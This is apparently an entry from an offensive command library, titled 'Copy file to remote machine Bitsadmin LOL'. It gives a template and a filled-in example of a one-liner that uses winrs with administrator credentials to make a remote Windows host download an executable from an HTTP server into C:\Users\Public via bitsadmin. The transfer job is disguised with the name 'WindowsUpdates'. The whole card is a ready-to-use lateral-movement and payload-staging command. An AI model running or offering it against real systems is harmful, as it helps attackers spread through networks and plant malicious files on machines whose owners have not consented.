---
id: f05262e3-3ebf-4042-aba9-bdbae78162b3
name: Copy file to remote machine Bitsadmin LOL
type: command
executor: ''
data: winrs -r:$SERVER -u:.\$USER -p:$PASSWORD "bitsadmin /transfer WindowsUpdates
  /priority normal http://$HTTP_SERVER/$FILENAME c:\\Users\\Public\$FILENAME"
output: winrs -r:ms-sql01 -u:.\Administrator -p:PassW0rd1 "bitsadmin /transfer WindowsUpdates
  /priority normal http://10.0.0.12/File.exe c:\\Users\\Public\File.exe"
created_at: '2023-01-12T22:08:55.684582+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Copy file to remote machine Bitsadmin LOL

```bash
winrs -r:$SERVER -u:.\$USER -p:$PASSWORD "bitsadmin /transfer WindowsUpdates /priority normal http://$HTTP_SERVER/$FILENAME c:\\Users\\Public\$FILENAME"
```

## Expected Output

```
winrs -r:ms-sql01 -u:.\Administrator -p:PassW0rd1 "bitsadmin /transfer WindowsUpdates /priority normal http://10.0.0.12/File.exe c:\\Users\\Public\File.exe"
```
